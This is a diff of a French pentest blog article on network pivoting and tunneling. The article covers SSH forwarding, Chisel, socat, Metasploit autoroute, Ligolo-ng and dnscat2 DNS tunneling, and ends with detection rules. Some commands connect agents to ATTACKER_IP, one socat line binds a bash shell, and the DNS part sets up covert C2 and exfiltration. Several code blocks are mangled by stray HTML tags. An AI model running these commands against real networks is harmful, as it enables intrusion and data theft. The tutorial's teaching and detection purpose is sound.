@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>Tunneling et pivoting réseau — Temgus.CyberBlog</title>
 <meta name="description" content="SSH tunneling, Chisel, Ligolo-ng et DNS tunneling pour se déplacer dans un réseau.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/tunneling-pivoting.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/tunneling-pivoting.html">
 <meta property="og:title" content="Tunneling et pivoting réseau — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="Tunneling et pivoting réseau — Temgus.CyberBlog">
 <meta name="twitter:description" content="SSH tunneling, Chisel, Ligolo-ng et DNS tunneling pour se déplacer dans un réseau.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,459 @@
   "headline": "Tunneling et pivoting réseau",
   "description": "SSH tunneling, Chisel, Ligolo-ng et DNS tunneling pour se déplacer dans un réseau.",
   "datePublished": "2025-05-25",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/tunneling-pivoting.html",
   "inLanguage": "fr",
   "keywords": "pivoting, tunneling, SSH, Chisel",
-  "timeRequired": "PT10M"
+  "timeRequired": "PT10M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">🕳️</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">Tunneling et pivoting réseau</h1>
-  <p style="color:#8892a4;max-width:500px">SSH tunneling, Chisel, Ligolo-ng et DNS tunneling pour se déplacer dans un réseau.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#tunneling-pivoting" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">🕳️</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">Tunneling et pivoting réseau</div>
+      <div class="meta-details">
+        <span>📅 2025-05-25</span>
+        <span>⏱ 10 min de lecture</span>
+        <span>🏷 Avancé</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#concepts-fondamentaux">Concepts fondamentaux</a></li>
+<li><a href="#ssh-tunneling">SSH Tunneling</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#port-forwarding-local">Port Forwarding Local</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#port-forwarding-distant">Port Forwarding Distant</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#dynamic-port-forwarding-socks-proxy-">Dynamic Port Forwarding (SOCKS Proxy)</a></li>
+<li><a href="#chisel-tunneling-via-http-s">Chisel — Tunneling via HTTP/S</a></li>
+<li><a href="#socat-swiss-army-knife-du-r-seau">Socat — Swiss Army Knife du réseau</a></li>
+<li><a href="#metasploit-pivoting-avanc-">Metasploit - Pivoting avancé</a></li>
+<li><a href="#ligolo-ng-le-pivot-moderne">Ligolo-ng — Le pivot moderne</a></li>
+<li><a href="#dns-tunneling-exfiltration-furtive">DNS Tunneling — Exfiltration furtive</a></li>
+<li><a href="#d-tection-des-tunnels">Détection des tunnels</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>Tunneling et pivoting réseau : se déplacer dans un réseau compromis</h1>
+
+<p>Le pivoting est la technique par laquelle un attaquant utilise une machine compromise comme <strong>tremplin</strong> pour atteindre des segments réseau inaccessibles directement. C'est aussi une compétence essentielle pour les pentesters afin de simuler des APT réalistes.</p>
+
+<h2 id="concepts-fondamentaux">Concepts fondamentaux</h2>
+
+<pre><code>Situation typique :
+
+<p>Internet ──→ [DMZ] ──→ [Réseau interne]</p>
+<p>│</p>
+<p>Pas d'accès direct depuis Internet</p>
+<p>Uniquement accessible via la DMZ</p>
+
+<p>Après compromission d'un serveur DMZ :</p>
+
+<p>Attaquant → [Serveur DMZ compromis] → [Réseau interne]</p>
+<p>↑</p>
+<p>Machine pivot</code></pre>
+
+<h2 id="ssh-tunneling">SSH Tunneling</h2>
+
+<h3 id="port-forwarding-local">Port Forwarding Local</h3>
+
+<pre><code class="language-bash"># Accéder à un service interne via la machine pivot
+<h1>Scénario : BDD MySQL sur 192.168.1.50:3306 (inaccessible directement)</h1>
+
+<p>ssh -L 3307:192.168.1.50:3306 user@pivot.exemple.com</p>
+<h1>-L [port_local]:[cible]:[port_cible]</h1>
+
+<h1>Maintenant accessible localement :</h1>
+<p>mysql -h 127.0.0.1 -P 3307 -u root -p</p>
+<h1>La connexion est tunnelée via SSH vers le MySQL interne</code></pre></h1>
+
+<h3 id="port-forwarding-distant">Port Forwarding Distant</h3>
+
+<pre><code class="language-bash"># Exposer un service local vers une machine distante
+<h1>Scénario : exposer votre listener Metasploit depuis derrière un NAT</h1>
+
+<p>ssh -R 4444:127.0.0.1:4444 user@serveur-public.com</p>
+<h1>-R [port_distant]:[host_local]:[port_local]</h1>
+
+<h1>Sur le serveur public, le port 4444 est maintenant connecté à votre machine locale</code></pre></h1>
+
+<h3 id="dynamic-port-forwarding-socks-proxy-">Dynamic Port Forwarding (SOCKS Proxy)</h3>
+
+<pre><code class="language-bash"># Créer un proxy SOCKS5 qui route tout via la machine pivot
+<p>ssh -D 1080 user@pivot.exemple.com</p>
+<h1>-D [port_socks_local]</h1>
+
+<h1>Configurer proxychains pour utiliser le tunnel</h1>
+<h1>/etc/proxychains4.conf</h1>
+<p>[ProxyList]</p>
+<p>socks5 127.0.0.1 1080</p>
+
+<h1>Utiliser n'importe quel outil via le tunnel</h1>
+<p>proxychains nmap -sT -Pn 192.168.1.0/24</p>
+<p>proxychains firefox  # Naviguer sur le réseau interne</p>
+<p>proxychains curl http://intranet.interne/</code></pre>
+
+<h2 id="chisel-tunneling-via-http-s">Chisel — Tunneling via HTTP/S</h2>
+
+<pre><code class="language-bash"># Chisel : tunnel TCP/UDP dans HTTP — passe les firewalls !
+<h1>https://github.com/jpillora/chisel</h1>
+
+<h1>Sur l'attaquant (serveur)</h1>
+<p>./chisel server --port 8080 --reverse</p>
+
+<h1>Sur la machine pivot (client)</h1>
+<p>./chisel client ATTACKER_IP:8080 R:socks</p>
+<h1>Crée un tunnel SOCKS5 inversé</h1>
+
+<h1>Tunneling d'un port spécifique</h1>
+<p>./chisel client ATTACKER_IP:8080 R:3306:192.168.1.50:3306</p>
+<h1>Le port 3306 de l'attaquant est maintenant connecté à la BDD interne</code></pre></h1>
+
+<h2 id="socat-swiss-army-knife-du-r-seau">Socat — Swiss Army Knife du réseau</h2>
+
+<pre><code class="language-bash"># Relay TCP simple (pivoting basique)
+<p>socat TCP-LISTEN:8080,fork TCP:192.168.1.50:80</p>
+<h1>Tout ce qui arrive sur 8080 est redirigé vers 192.168.1.50:80</h1>
+
+<h1>Relay avec chiffrement SSL</h1>
+<p>socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork TCP:192.168.1.50:80</p>
+
+<h1>Créer un reverse shell persistant</h1>
+<p>socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash</code></pre>
+
+<h2 id="metasploit-pivoting-avanc-">Metasploit - Pivoting avancé</h2>
+
+<pre><code class="language-bash"># Dans Metasploit - après avoir un shell sur la machine pivot
+<p>msf6 &gt; use post/multi/manage/autoroute</p>
+<p>msf6 post(autoroute) &gt; set SESSION 1</p>
+<p>msf6 post(autoroute) &gt; set SUBNET 192.168.1.0</p>
+<p>msf6 post(autoroute) &gt; run</p>
+<h1>Metasploit route maintenant vers 192.168.1.0/24 via la session 1</h1>
+
+<h1>Scan du réseau interne via le pivot</h1>
+<p>msf6 &gt; use auxiliary/scanner/portscan/tcp</p>
+<p>msf6 auxiliary(tcp) &gt; set RHOSTS 192.168.1.0/24</p>
+<p>msf6 auxiliary(tcp) &gt; set PORTS 22,80,443,3306,3389</p>
+<p>msf6 auxiliary(tcp) &gt; run</p>
+
+<h1>SOCKS proxy via Metasploit</h1>
+<p>msf6 &gt; use auxiliary/server/socks_proxy</p>
+<p>msf6 auxiliary(socks_proxy) &gt; set SRVPORT 1080</p>
+<p>msf6 auxiliary(socks_proxy) &gt; set VERSION 5</p>
+<p>msf6 auxiliary(socks_proxy) &gt; run</code></pre>
+
+<h2 id="ligolo-ng-le-pivot-moderne">Ligolo-ng — Le pivot moderne</h2>
+
+<pre><code class="language-bash"># Ligolo-ng : tunneling TUN/TAP - le plus transparent
+<h1>https://github.com/nicocha30/ligolo-ng</h1>
+
+<h1>Sur l'attaquant (proxy)</h1>
+<p>sudo ip tuntap add user kali mode tun ligolo</p>
+<p>sudo ip link set ligolo up</p>
+<p>./proxy -selfcert</p>
+
+<h1>Sur la machine pivot (agent)</h1>
+<p>./agent -connect ATTACKER_IP:11601 -ignore-cert</p>
+
+<h1>Dans l'interface ligolo</h1>
+<p>ligolo-ng » session</p>
+<p>ligolo-ng » start --tun ligolo</p>
+
+<h1>Ajouter une route vers le réseau interne</h1>
+<p>sudo ip route add 192.168.1.0/24 dev ligolo</p>
+
+<h1>Maintenant accessible directement !</h1>
+<p>nmap -sV 192.168.1.50</p>
+<p>curl http://192.168.1.50/</p>
+<p>ssh user@192.168.1.50</code></pre>
+
+<h2 id="dns-tunneling-exfiltration-furtive">DNS Tunneling — Exfiltration furtive</h2>
+
+<pre><code class="language-python"># Le DNS tunneling encapsule des données dans des requêtes DNS
+<h1>Passe presque tous les firewalls car le DNS est toujours autorisé</h1>
+
+<h1>Dnscat2 - Tunnel C2 via DNS</h1>
+<h1>Côté serveur (contrôlé par l'attaquant)</h1>
+<p>ruby dnscat2.rb --dns domain=tunnel.exemple.com --no-cache</p>
+
+<h1>Côté client (machine compromise)</h1>
+<p>./dnscat --dns server=8.8.8.8,port=53,domain=tunnel.exemple.com</p>
+
+<h1>Les communications sont encodées dans des requêtes DNS :</h1>
+<h1>Requête : a1b2c3d4.tunnel.exemple.com (données encodées dans le sous-domaine)</h1>
+<h1>Réponse : TXT record avec données de réponse</h1>
+
+<h1>Détection du DNS tunneling</h1>
+<h1>→ Requêtes DNS avec sous-domaines anormalement longs</h1>
+<h1>→ Volume élevé de requêtes vers un seul domaine</h1>
+<h1>→ Entropie élevée dans les noms de sous-domaines</code></pre></h1>
+
+<h2 id="d-tection-des-tunnels">Détection des tunnels</h2>
+
+<pre><code class="language-bash"># Détecter le SSH tunneling avec Suricata
+<p>alert tcp any any -&gt; any 22 (msg:"SSH Tunnel Suspected";</p>
+<p>flow:to_server,established;</p>
+<p>content:"|00 00 00|";</p>
+<p>threshold:type both, track by_src, count 100, seconds 60;</p>
+<p>sid:1000001;)</p>
+
+<h1>Détecter le DNS tunneling avec RITA</h1>
+<h1>Analyse le traffic Zeek et détecte les beacons et DNS tunnels</h1>
+<p>rita analyze --input zeek_logs/ --output rita-analysis/</p>
+<p>rita show-exploded-dns -H --limit 100 rita-analysis</p>
+
+<h1>Seuils suspects :</h1>
+<h1>DNS queries/minute &gt; 100 vers même domaine</h1>
+<h1>Longueur moyenne sous-domaine &gt; 30 caractères</h1>
+<h1>Entropie de Shannon &gt; 3.5 bits/caractère</code></pre></h1>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Le pivoting est une compétence avancée qui démontre la vraie profondeur d'une compromission. En défense, la <strong>segmentation réseau stricte</strong> (micro-segmentation) limite considérablement les possibilités de pivoting. En attaque/test, maîtriser SSH tunneling, Chisel et Ligolo-ng permet de simuler fidèlement le comportement des APT réels.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#tunneling-pivoting" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/securite-cloud.html" class="nav-prev">← Sécurité cloud : AWS, Azure et GCP</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/siem-detection.html" class="nav-next">SIEM et détection d'intrusion : voir tout ce qui se passe →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
